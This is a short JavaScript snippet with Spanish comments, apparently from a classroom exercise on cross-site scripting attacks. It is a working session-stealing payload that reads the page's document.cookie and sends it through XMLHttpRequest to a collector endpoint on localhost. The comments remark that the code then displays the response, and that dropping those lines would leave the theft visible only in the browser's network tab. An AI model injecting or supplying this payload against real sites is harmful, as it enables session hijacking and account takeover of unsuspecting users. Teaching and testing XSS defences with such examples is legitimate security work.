xmlhttp = new XMLHttpRequest();
xmlhttp.open("get", "http://localhost:8081/Ej08_XSS_EjemplosAtaque_Indeseables/peticion_inocua?galletas="+document.cookie,false);
xmlhttp.send(null);
str1=xmlhttp.responseText;
alert(str1);
//Seguimos mandando la id de la session a nuestra pagina, pero esta vez por ajax
//Las dos ultimas lineas realmente sobran
//si las comentamos la unica manera que tendriamos para saber
//las peticiones que se han hecho desde la web seria dando a f12 en el chrome
//y en network ver la peticiones 


